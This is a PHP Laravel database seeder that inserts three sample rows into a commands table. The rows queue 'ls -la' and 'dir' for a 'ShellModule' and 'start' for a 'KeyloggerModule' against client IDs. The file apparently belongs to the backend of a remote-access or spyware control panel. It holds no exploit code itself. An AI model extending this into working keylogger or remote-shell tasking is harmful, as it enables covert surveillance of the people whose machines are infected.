<?php

use App\Commands;
use Illuminate\Database\Seeder;

class CommandsTableSeeder extends Seeder
{
	public function run()
	{
		Commands::create([
			'client_id'  => 'S1D8VCGV',
			'command'    => 'ls -la',
			'module'     => 'ShellModule',
			'created_at' => date('Y-m-d H:i:s'),
			'sent_at'    => '0000-00-00 00:00:00'
		]);

		Commands::create([
			'client_id'  => 'WD-WCC3F7XK9Y9P',
			'command'    => 'dir',
			'module'     => 'ShellModule',
			'created_at' => date('Y-m-d H:i:s'),
			'sent_at'    => '0000-00-00 00:00:00'
		]);

		Commands::create([
			'client_id'  => 'WD-WCC3F7XK9Y9P',
			'command'    => 'start',
			'module'     => 'KeyloggerModule',
			'created_at' => date('Y-m-d H:i:s'),
			'sent_at'    => '0000-00-00 00:00:00'
		]);
	}
}